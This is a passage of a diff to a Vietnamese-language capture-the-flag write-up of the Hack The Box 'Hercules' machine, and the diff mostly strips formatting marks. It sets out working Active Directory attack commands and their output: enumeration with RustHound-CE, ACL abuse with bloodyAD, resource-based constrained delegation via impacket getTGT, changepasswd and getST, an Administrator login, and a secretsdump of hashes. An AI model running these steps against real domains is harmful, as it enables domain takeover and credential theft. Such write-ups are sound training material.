+RustHound-CE Enumeration Completed at 16:30:23 on 11/30/25! Happy Graphing!
 ```
 
 Mình nhìn thấy thì có nhiều output khác nhau nà mình ko thể nhìn thấy **`bloodhound-python`** 
@@ -2667,7 +2646,7 @@ Mình nhìn thấy thì có nhiều output khác nhau nà mình ko thể nhìn t
 Và điều này nó chỉ bổ sung thêm những gì mình đang thực hiện trong mục tiêu dùng kerberos để mình có thể tạo **`/etc/krb5.conf`** và chạy lại với options **`-k`** mà ko cần cung cấp mật khẩu và tên người dùng. 
 
 ```bash
-**┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
+┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
 └─$ nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --generate-krb5-file krb5.conf
 SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
 SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
@@ -2693,11 +2672,11 @@ SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:chang
 
 [domain_realm]
     .hercules.htb = HERCULES.HTB
-    hercules.htb = HERCULES.HTB**
+    hercules.htb = HERCULES.HTB
 ```
 
 ```bash
-**┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
+┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
 └─$ ./rusthound-ce -d hercules.htb -f dc.hercules.htb -c All -k -no-pass -z              
 ---------------------------------------------------
 Initializing RustHound-CE at 16:39:42 on 11/30/25
@@ -2738,7 +2717,7 @@ Powered by @g0h4n_0
 [2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
 [2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] .//20251130164010_hercules-htb_rusthound-ce.zip created!
 
-RustHound-CE Enumeration Completed at 16:40:10 on 11/30/25! Happy Graphing!**
+RustHound-CE Enumeration Completed at 16:40:10 on 11/30/25! Happy Graphing!
 
 ```
 
@@ -2798,7 +2777,7 @@ Mình có thể dùng [**Certipy**](https://github.com/ly4k/Certipy) để explo
 Do password cũ bị sai nên đổi lại **`Hoangphuc123@`** 
 
 ```bash
-**┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
+┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
 └─$ export KRB5CCNAME=~/Desktop/fernando.r.ccache 
                                                                                                                                                                                       
 ┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
@@ -2966,7 +2945,7 @@ Certificate Templates
                                           HERCULES.HTB\Enterprise Admins
     [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
     [!] Vulnerabilities
-      ESC3                              : Template has Certificate Request Agent EKU set.**
+      ESC3                              : Template has Certificate Request Agent EKU set.
 ```
 
 Giờ thì mình đã check trên `fernando.r` , giờ thì mục tiêu tiếp theo là gì ? 
@@ -3020,7 +2999,7 @@ Request TGT cho **`ashley.b`**
 Tiếp cận account **`ashley.b`** và session này, đồng thời nó cũng là member của **`REMOTE MANAGEMENT@HSERCULES.HTB`** 
 
 ```bash
-**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
+┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
 └─$ klist
 Ticket cache: FILE:/home/kali/Desktop/shadow_credentials/ashley.b.ccache
 Default principal: ashley.b@HERCULES.HTB
@@ -3140,7 +3119,7 @@ Regards, Ashley.
 --_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
 Content-Type: text/html; charset="us-ascii"
 Content-Transfer-Encoding: quoted-printable
-PS C:\Users\ashley.b\Desktop\Mail>**
+PS C:\Users\ashley.b\Desktop\Mail>
 ```
 
 Từ nội dụng này mình có thể nhìn thấy đây là script shortcut mà mình có thể chạy manual.
@@ -3148,13 +3127,13 @@ Từ nội dụng này mình có thể nhìn thấy đây là script shortcut m�
 → Check nó thử. 
 
 ```bash
-**PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
+PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
 Start-ScheduledTask -TaskName "Password Cleanup"
-PS C:\Users\ashley.b\Desktop>**
+PS C:\Users\ashley.b\Desktop>
 ```
 
 ```bash
-**PS C:\Users\ashley.b> dir
+PS C:\Users\ashley.b> dir
 
     Directory: C:\Users\ashley.b
 
@@ -3180,11 +3159,11 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----                                                                  
 -a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           
 
-PS C:\Users\ashley.b\Scripts>**
+PS C:\Users\ashley.b\Scripts>
 ```
 
 ```bash
-**PS C:\Users\ashley.b\Scripts> type cleanup.ps1
+PS C:\Users\ashley.b\Scripts> type cleanup.ps1
 function CanPasswordChangeIn {
     param ($ace)
     if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
@@ -3234,7 +3213,7 @@ foreach($object in $objects){
         }
     }
 }
-PS C:\Users\ashley.b\Scripts>**
+PS C:\Users\ashley.b\Scripts>
 ```
 
 Script này sẽ tự động clean up trong AD khi nhóm **`IT Support`** cho phép chạy change password của object. 
@@ -3242,11 +3221,11 @@ Script này sẽ tự động clean up trong AD khi nhóm **`IT Support`** cho p
 → Mình thử check file **`log.txt`** 
 
 ```bash
-**PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1**
+PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
 ```
 
 ```bash
-**PS C:\Users\ashley.b\Desktop> cd ..\Scripts
+PS C:\Users\ashley.b\Desktop> cd ..\Scripts
 PS C:\Users\ashley.b\Scripts> dir
 
     Directory: C:\Users\ashley.b\Scripts
@@ -3256,11 +3235,11 @@ Mode                 LastWriteTime         Length Name
 -a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           
 -a----         12/1/2025   7:52 PM           1388 log.txt                                                               
 
-PS C:\Users\ashley.b\Scripts>**
+PS C:\Users\ashley.b\Scripts>
 ```
 
 ```bash
-**PS C:\Users\ashley.b\Scripts> type log.txt
+PS C:\Users\ashley.b\Scripts> type log.txt
 
 Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
 
@@ -3276,7 +3255,7 @@ Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=h
 
 Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
 
-Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb**
+Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
 ```
 
 Mình có thể thấy ở đây ko có **`iis_administrator`** nhưng mình vẫn chưa enable và reset passsword. 
@@ -3288,7 +3267,7 @@ Trong bloodhound cho mình thấy **`ashley.b`** là thành viên của **`IT SU
 → Vì vậy mình sẽ dùng điểm này để cấp **`GenericAll`** trên **`Forest Migration`** tới **`IT Support`** vì vậy mình có reset **`iis_administrator`** password và **`GenericAll`** trên **`Auditor`** một lần nữa để re-enable **`iis_administrator`** 
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop]
+┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ export KRB5CCNAME=~/Desktop/Auditor.ccache
                                                                                                                       
 ┌──(env)─(kali㉿kali)-[~/Desktop]
@@ -3297,13 +3276,13 @@ Trong bloodhound cho mình thấy **`ashley.b`** là thành viên của **`IT SU
                                                                                                                       
 ┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ bloodyAD -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.10.11.91 add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
-[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB**
+[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
 ```
 
 Giờ thì mình chạy lại script 
 
 ```bash
-**PS C:\Users\ashley.b\Scripts> cd ..\Desktop
+PS C:\Users\ashley.b\Scripts> cd ..\Desktop
 PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
 PS C:\Users\ashley.b\Desktop> cd ..\Scripts
 PS C:\Users\ashley.b\Scripts> dir
@@ -3355,7 +3334,7 @@ Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC
 
 Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
 
-PS C:\Users\ashley.b\Scripts>**
+PS C:\Users\ashley.b\Scripts>
 ```
 
 Giờ mình nhìn thấy cleanup cho **`IIS_Administrator`** 
@@ -3399,45 +3378,43 @@ Tiếp tục request TGT
 Đầu tiên mình set môi trường 
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop]
+┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ export KRB5CCNAME=iis_webserver\$.ccache  
                                                                                                                       
-┌──(env)─(kali㉿kali)-[~/Desktop]
-└─$** 
 ```
 
 Mình sẽ có được TGT thông qua hàm băm vượt qua để sử dụng RC4.
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop]
+┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ sudo python3 /usr/share/doc/python3-impacket/examples/getTGT.py -hashes :$(pypykatz crypto nt 'Hoangphuc123@') hercules.htb/iis_webserver$
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in iis_webserver$.ccache**
+[*] Saving ticket in iis_webserver$.ccache
 ```
 
 Sau đó lấy TGT session key. 
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop]
+┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ sudo python3 /usr/share/doc/python3-impacket/examples/describeTicket.py iis_webserver\$.ccache | grep 'Ticket Session Key'
 [*] Ticket Session Key            : 5a8572199e7fc5cc0dcf1758aef203fe
                                                                                                                       
 ┌──(env)─(kali㉿kali)-[~/Desktop]
-└─$** 
+└─$
 ```
 
 Sau đó thay đổi hàm băm NT của tài khoản được kiểm soát không có SPN bằng khóa phiên TGT.
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop]
+┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ sudo python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -newhashes :5a8572199e7fc5cc0dcf1758aef203fe hercules.htb/iis_webserver$:'Hoangphuc123@'@dc.hercules.htb -k
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Changing the password of hercules.htb\iis_webserver$
 [*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
 [*] Password was changed successfully.
-[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).**
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
 ```
 
 Cuối cùng, chúng ta có thể nhận được phiếu dịch vụ được ủy quyền thông qua **`S4U2self+U2U`**, tiếp theo là **`S4U2proxy`**.
@@ -3446,21 +3423,21 @@ Cuối cùng, chúng ta có thể nhận được phiếu dịch vụ được �
 > 
 
 ```bash
-**┌──(env)─(kali㉿kali)-[~/Desktop]
+┌──(env)─(kali㉿kali)-[~/Desktop]
 └─$ sudo python3 /usr/share/doc/python3-impacket/examples/getST.py -u2u -impersonate Administrator -spn cifs/dc.hercules.htb -k -no-pass hercules.htb/iis_webserver$
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating Administrator
 [*] Requesting S4U2self+U2U
 [*] Requesting S4U2Proxy
-[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache**
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
 ```
 
 Sau khi có TGT **`Administrator`** thì vào bằng remote
 
 ```bash
                                                                                     
-**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
+┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
 └─$ export KRB5CCNAME=~/Desktop/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
                                                                                     
 ┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
@@ -3530,13 +3507,13 @@ Mode                 LastWriteTime         Length Name
 
 PS C:\Users\Admin\Desktop> type root.txt
 8305c4c8b141aa6cb8213d6786afb045
-PS C:\Users\Admin\Desktop>**
+PS C:\Users\Admin\Desktop>
 ```
 
 Giờ thì mình thực hiện `passing-the-ticket` bằng cách dùng `impacket-secretsdump` để dump hashes và LSA secrets
 
 ```bash
-**└─$ impacket-secretsdump -k -no-pass dc.hercules.htb
+└─$ impacket-secretsdump -k -no-pass dc.hercules.htb
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Service RemoteRegistry is in stopped state
@@ -3544,7 +3521,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Target system bootKey: 0x4d4922ac5f690741fd77d8937655a391
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 <SNIP>
-[*] Cleaning up...**
+[*] Cleaning up...
 ```
 
 ![image](/assets/img/HTB/season9/Hercules/image105.png)
